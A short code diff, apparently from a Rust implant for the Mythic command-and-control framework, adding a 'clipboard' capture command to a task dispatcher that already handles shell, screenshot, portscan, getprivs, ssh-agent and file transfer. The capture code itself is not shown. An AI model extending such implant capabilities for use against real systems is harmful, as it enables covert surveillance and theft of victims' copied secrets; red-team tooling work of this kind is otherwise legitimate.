@@ -11,7 +11,7 @@ use std::sync::{
 
 // Import all other commands
 use crate::{
-    cat, cd, cp, download, exit, getenv, getprivs, jobs, ls, mkdir, mv, netstat, portscan, ps, pwd,
+    cat, cd, clipboard, cp, download, exit, getenv, getprivs, jobs, ls, mkdir, mv, netstat, portscan, ps, pwd,
     redirect, rm, screenshot, setenv, shell, sleep, ssh, unsetenv, upload, workinghours,
 };
 
@@ -136,6 +136,7 @@ impl Tasker {
                             "rm" => rm::remove(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "setenv" => setenv::set_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "screenshot" => screenshot::take_screenshot(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
+                            "clipboard" => clipboard::take_clipboard(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "ssh-agent" => ssh::agent::ssh_agent(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
                             "unsetenv" => unsetenv::unset_env(task).unwrap_or_else(|e| mythic_error!(task.id, e.to_string())),
 
